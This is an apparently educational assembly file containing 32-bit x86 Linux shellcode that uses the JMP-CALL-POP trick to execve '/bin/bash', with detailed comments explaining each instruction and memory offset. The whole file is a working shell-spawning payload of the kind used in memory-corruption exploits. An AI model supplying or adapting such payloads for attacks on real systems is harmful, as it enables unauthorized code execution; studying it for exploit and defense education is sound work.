# Written for the GNU assembler
# Shellcode written in JMP CALL POP
.text

.globl _start

_start:
	jmp daPop
	
	daLoad:
		#ESI now stores the address of the string
		popl %esi

		xorl %eax,%eax
		
		#ESI points to address of the string str1
		
		#We move the value stored at al, which is 0 (xor) to 9th byte of address stored by esi to null terminate the address string
		movb %al, 0x9(%esi)
		
		# We store the value of esi (address of str1) onto the 10th byte of esi
		# Now the 10th byte of esi stores the address of str1 as well.We copied contents of esi on to starting 10th byte of esi
		movl %esi, 0xa(%esi)

		#on the 14th byte of esi, we store the nul value
		# esi+14 now marks the address of the null byte as required by execve argument
		movl %eax, 0xe(%esi)
		
		#Line up execve arguments. x64 syntax could be very different from this. x64 addresses are typically 8 bytes.
		
		# Eax must store the syscall number for execve which is 11
		movb $11, %al
		
		# Moving the address of str1 which is the value stored at %esi	
		movl %esi,%ebx
		
		#ecx must store the address which stores the address of str1
		#We loaded this into the 10th byte of the value stored at esi
		#Leal will treat the contents of esi as address, then add 10 to that and fetch this address and store it on ecx
		#Ecx now stores the value of address stored by esi plus 10.This address stores the address of str1 and this address was loaded
		# onto ecx.
		leal 0xa(%esi), %ecx

		#Address of the null byte is important for the final argument of execve
		leal 0xe(%esi), %edx
		int $0x80
		

	daPop:
		call daLoad
		#Pushes the address of the string to the stack
		str1: 
			.ascii "/bin/bashABBBBCCCC"
